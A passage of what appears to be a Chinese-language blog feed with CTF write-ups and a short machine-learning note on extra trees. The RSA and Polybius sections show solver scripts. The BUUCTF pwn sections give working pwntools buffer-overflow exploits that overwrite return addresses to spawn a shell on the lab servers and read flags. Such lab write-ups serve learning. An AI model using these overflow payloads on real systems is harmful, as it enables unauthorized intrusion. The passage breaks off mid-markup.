class="number">17083941230213489700426636484487738282426471494607098847295335339638177583685457921198569105417734668692072727759139358207667248703952436680183153327606147421932365889983347282046439156176685765143620637107347870401946946501620531665573668068349080410807996582297505889946205052879002028936125315312256470583622913646319779125559691270916064588684997382451412747432722966919513413709987353038375477178385125453567111965259721484997156799355617642131569095810304077131053588483057244340742751804935494087687363416921314041547093118565767609667033859583125275322077617576783247853718516166743858265291135353895239981121</span></span><br><span class="line">e = <span class="number">54722</span></span><br><span class="line">c = <span class="number">3738960639194737957667684143565005503596276451617922474669745529299929395507971435311181578387223323429323286927370576955078618335757508161263585164126047545413028829873269342924092339298957635079736446851837414357757312525158356579607212496060244403765822636515347192211817658170822313646743520831977673861869637519843133863288550058359429455052676323196728280408508614527953057214779165450356577820378810467527006377296194102671360302059901897977339728292345132827184227155061326328585640019916328847372295754472832318258636054663091475801235050657401857262960415898483713074139212596685365780269667500271108538319</span></span><br><span class="line">p = <span class="number">161136651053130509602530659420755324119806487925813087617466818245407407797561810253722204813002837916779909309520498985459703212021249251124954613236122142746302911323565396331355397916764254680629384957057354297855676493062493901977415968666512459829211010720514167083018352796496733697235524845188512914793</span></span><br><span class="line">q = <span class="number">106021448991021391444550749375115277080844281746248845802565680557785009341952320484175568763707424932172033597514861602114171459176440279045761846695231788376075050452154924141266290931413542110639081792550648106240966552406813059396358355737185354885474455248579946190266152416149137616855791805617206153497</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = e // <span class="number">2</span></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = gmpy2.iroot(<span class="built_in">pow</span>(c, d, n), <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;&#x27;</span><br></pre></td></tr></table></figure><h3 id="wustctf2020dp_leaking_1s_very_dangerous"><a class="markdownIt-Anchor" href="#wustctf2020dp_leaking_1s_very_dangerous"></a> [WUSTCTF2020]dp_leaking_1s_very_d@angerous</h3><p>題目如下</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br></pre></td></tr></table></figure><p>dp的意思是d mod (p-1)，用來快速解密用的，但一個dp好像不能解，沒琢磨出東西來，就直接用n拆p, q，暴力硬做了。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span></span><br><span class="line">c = <span class="number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span></span><br><span class="line">dp = <span class="number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">12204917011499204793467396627331950459243603269732530719870032567474409945243640569351016419835483810515390876443640549604664275934407520354979414742015923</span></span><br><span class="line">q = <span class="number">12847964754765427496399764780328918622503990027015223921752369659611143245908239173177604049265523011184163182090867099853786582101440246414647619495980989</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>輸出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;&#x27;</span><br></pre></td></tr></table></figure><p>dp_leaking_1s_very_d@angerous，糟…糟糕，dp洩漏到底是哪個部份危險，我去看別人的題解好了。</p><p>懂了，知道n, e, dp之後，可以快速求出p, q，我把推導抄下來。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">∗</mi><mo stretchy="false">(</mo><mi>q</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>k</mi><mi mathvariant="normal">∗</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">∗</mi><mo stretchy="false">(</mo><mi>q</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mo>=</mo><mi>d</mi><mi>d</mi><mi>p</mi><mo>≡</mo><mi>d</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mi mathvariant="normal">∗</mi><mi>e</mi><mo>≡</mo><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mi mathvariant="normal">∗</mi><mi>e</mi><mo>=</mo><mi>k</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mspace linebreak="newline"></mspace><mi>d</mi><mi>p</mi><mi mathvariant="normal">∗</mi><mi>e</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo>=</mo><mi>k</mi><mo stretchy="false">(</mo><mi>p</mi><mi mathvariant="normal">−</mi><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(N)=(p−1)∗(q−1)\\ed≡1(modφ(N))\\ed=1+kφ(N)\\ed=1+k∗(p−1)∗(q−1)\\ed≡1(modp−1)\\dp=d%(p−1)\\dp≡d(modp−1)\\dp∗e≡ed≡1(modp−1)\\dp∗e=k(p−1)+1\\dp∗e−1=k(p−1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mord">∗</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord">∗</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mord">∗</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">∗</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">∗</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord">∗</span><span class="mord mathdefault">e</span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p><p>而未知數k可以被爆破。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_dp</span>(<span class="params">dp, e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dp * e):</span><br><span class="line">        <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % i == <span class="number">0</span>:</span><br><span class="line">            p = (dp * e - <span class="number">1</span>) // i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(p)</span><br><span class="line">                q = n // p</span><br><span class="line">                <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><p>在n未知可以被哪些數字分解的情況下，感覺滿好用的，我跳過步驟了。</p><h3 id="bjdctf2020polybius"><a class="markdownIt-Anchor" href="#bjdctf2020polybius"></a> [BJDCTF2020]Polybius</h3><p>題目給定如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文：ouauuuoooeeaaiaeauieuooeeiea</span><br><span class="line">hint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ=</span><br><span class="line">flag:解出明文后，请加上BJD&#123;&#125;</span><br></pre></td></tr></table></figure><p>先以Polybius crypto進行搜尋，找到相關線索。</p><p>The Polybius square, also known as the Polybius checkerboard, is a device invented by the ancient Greeks Cleoxenus and Democleitus, and made famous by the historian and scholar Polybius. The device is used for fractionating plaintext characters so that they can be represented by a smaller set of symbols, which is useful for telegraphy, steganography, and cryptography. The device was originally used for fire signalling, allowing for the coded transmission of any message, not just a finite amount of predetermined options as was the convention before. --維基百科</p><p><img src="https://en.wikipedia.org/wiki/Polybius_square#/media/File:Polybius_square.png" alt="" /></p><p>然後hint中有個=先盲猜是base64，解密成ascii後得到The length of this plaintext: 14的資訊。</p><p>密文中的aeiou剛好是五個母音，盲猜為行列，但依據一般的解碼方式沒辦法解出來，最後去找了wp才發現是硬爆。</p><p><a href="https://www.shawroot.cc/341.html">wp</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">&quot;ouauuuoooeeaaiaeauieuooeeiea&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">&#x27;aeiou&#x27;</span>, <span class="number">5</span>):</span><br><span class="line">    key.append(<span class="string">&#x27;&#x27;</span>.join(i))</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> key:</span><br><span class="line">    temp_cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> cipher:</span><br><span class="line">        temp_cipher += <span class="built_in">str</span>(each.index(temp))    </span><br><span class="line">        <span class="comment">#這裡是將字母的表換成數字的表以便後續計算</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(temp_cipher),<span class="number">2</span>):</span><br><span class="line">        current_ascii = <span class="built_in">int</span>(temp_cipher[i])*<span class="number">5</span>+<span class="built_in">int</span>(temp_cipher[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="comment">#因为棋盘密码是采用两位一起表示一个字母</span></span><br><span class="line">        <span class="keyword">if</span> current_ascii&gt;<span class="built_in">ord</span>(<span class="string">&#x27;i&#x27;</span>):</span><br><span class="line">            current_ascii+=<span class="number">1</span></span><br><span class="line">        result += <span class="built_in">chr</span>(current_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="built_in">print</span>(each,result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>極限隨機樹 extra trees</title>
      <link href="/extra-trees-regressor/"/>
      <url>/extra-trees-regressor/</url>
      
        <content type="html"><![CDATA[<p>關於極限隨機樹(extra trees)的學習筆記。</p><h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3><p>極限隨機樹跟隨機森林(random forest)一樣，都是由多個決策樹(decision tree)所組成，而算法決定他們之間的差異。</p><p>隨機森林由Bagging方法抽取隨機的子樣本，創造差異的子模型後實現集成學習，決策樹的分割藉由熵(Entropy)以及Gini不純度(Gini Impurity)來在隨機子集中找出最佳的分割。</p><p>而extra trees相較於random forest，差異展現在決策樹的分割上，extra trees直接使用整個數據集，抽一個隨機的特徵以及該隨機特徵上的隨機閾值進行分割。</p><p>extra trees中的每個決策樹的隨機性比起random forest會變得更大，這代表每個子模型的性能會大大的降低，不過集成的模型數量夠大，最終集成學習的結果也會不錯，這也是extra trees這種極度隨機的集成學習具有價值的理論依據。</p><p>extra trees的這種隨機性可以用來抑製過擬合，不會因為某幾個極端的樣本點而將整個模型帶偏。這是因為每棵決策樹都是極度隨機的，所以很有可能大部分決策樹是看不到這些特別極端的樣本點的，因此整個模型的過擬合現象會得到抑制。抑製過擬合過程中降低了方差，與此同時也會增大了偏差，因此在使用extra trees之前，需要檢查樣本數據以及要解決的問題是否適合使用extra trees。</p><h3 id="演算法"><a class="markdownIt-Anchor" href="#演算法"></a> 演算法</h3><p>by <a href="https://doi.org/10.1007/s10994-006-6226-1">原始論文</a></p><p><img src="1.png" alt="" /></p><h3 id="速度上的差異"><a class="markdownIt-Anchor" href="#速度上的差異"></a> 速度上的差異</h3><p>在大資料量的數據上，random forest的訓練速度會有難以抹滅的速度劣勢，若是抽出的子數據集有n筆資料，每筆資料有m個特徵，在第一次找尋分割點的時候，就需要做(n-1)*m次的運算。</p><p>而與之相對的是extra trees可以將建立一個決策樹的node的時間縮短到k次(k為整個數據集大小)，畢竟是透過隨機選擇，速度上快上很多。</p><p>透過<a href="https://quantdare.com/what-is-the-difference-between-extra-trees-and-random-forest/">此網站</a>，可以看到</p><p><img src="results.png" alt="" /></p><p>在訓練成效上相差無幾，但速度上快許多。</p><h3 id="結論"><a class="markdownIt-Anchor" href="#結論"></a> 結論</h3><ul><li>extra trees使用整個原始樣本而不是隨機子集，從而減少了偏差，但由於不是採用最佳分割，所以也會增加偏差。</li><li>隨機化的樹算法隨機選擇每個節點的分裂點，從而減少方差。</li><li>它比隨機森林算法快得多，因為它不花時間選擇最佳分割點。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF pwn 1</title>
      <link href="/ctf-pwn-buuctf-1/"/>
      <url>/ctf-pwn-buuctf-1/</url>
      
        <content type="html"><![CDATA[<h3 id="test_your_nc"><a class="markdownIt-Anchor" href="#test_your_nc"></a> test_your_nc</h3><p>拿到一個檔案，和題目名稱為test_your_nc，先以nc連上server。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc node4.buuoj.cn 28172</span><br></pre></td></tr></table></figure><p>沒有看到任何東西，隨便輸入個字串發現提示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/sh: 2: 字串: not found</span><br></pre></td></tr></table></figure><p>感覺是linux的指令，ls查看一下內容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>原本我忽略了裡面有什麼東西，還打開IDA來看，結果好像也只是把輸入送進stseam裡面，再看一次ls的輸出，發現就有一個flag檔，直接用cat打開來看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag</span><br></pre></td></tr></table></figure><p>取得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5a1968c5-04dd-46e9-9832-c704e1d65513&#125;</span><br></pre></td></tr></table></figure><h3 id="rip"><a class="markdownIt-Anchor" href="#rip"></a> rip</h3><p>用IDA打開附件的程式進行反邊譯，得到下圖。</p><p><img src="rip.png" alt="" /></p><p>0000000000401191 的位置上有一個 call _system 的動作，意味著理論上只要讓程式運行到此位置即可。</p><p><img src="rip1.png" alt="" /></p><p>先用 15 個 A 來將字串s進行填充，再讓程式跳到會呼叫 system 的函式 fun 的開頭即可。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28681</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + p64(<span class="number">0x401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>獲取系統權限，cat flag取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3f344e2b-bf76-4e47-acdc-effdebcdeb0b&#125;</span><br></pre></td></tr></table></figure><h3 id="warmup_csaw_2016"><a class="markdownIt-Anchor" href="#warmup_csaw_2016"></a> warmup_csaw_2016</h3><p>跟上一題差不多的做法，char s配置的大小是64 bits，返回的地址是8 bits，相加等於72 bits，前面填充A，後面填要跳到的位置。</p><p><img src="warmup.png" alt="" /></p><p>進入0x40060d，執行cat flag.txt。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29603</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">p.writeline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>取得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line">&gt;flag&#123;e1cac524-0be0-43ce-9f8f-27ee1c49dc33&#125;</span><br><span class="line">timeout: the monitored command dumped core</span><br></pre></td></tr></table></figure><h3 id="ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#ciscn_2019_n_1"></a> ciscn_2019_n_1</h3><p>用IDA打開附件的程式進行反邊譯，main裡面會執行func此函式，所以讓v1溢位到v2即可。</p><p><img src="ciscn_2019_n_1.png" alt="" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">float_to_hex</span>(<span class="params">f</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;f&#x27;</span>, f))[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26637</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">44</span> + p64(<span class="built_in">int</span>(float_to_hex(<span class="built_in">float</span>(<span class="number">11.28125</span>)), <span class="number">16</span>))</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">sh.writeline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Let&#x27;s guess the number.</span><br><span class="line">flag&#123;42d2e550-a032-4bb5-921b-055167ee15a6&#125;</span><br></pre></td></tr></table></figure><h3 id="jarvisoj_level0"><a class="markdownIt-Anchor" href="#jarvisoj_level0"></a> jarvisoj_level0</h3><p>用IDA反編譯之後找到會執行vulnerable_function。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>塞滿128個A，再塞8個返回字元的空間，之後就可以塞進要跳轉到的記憶體，取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26099</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">136</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>取得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 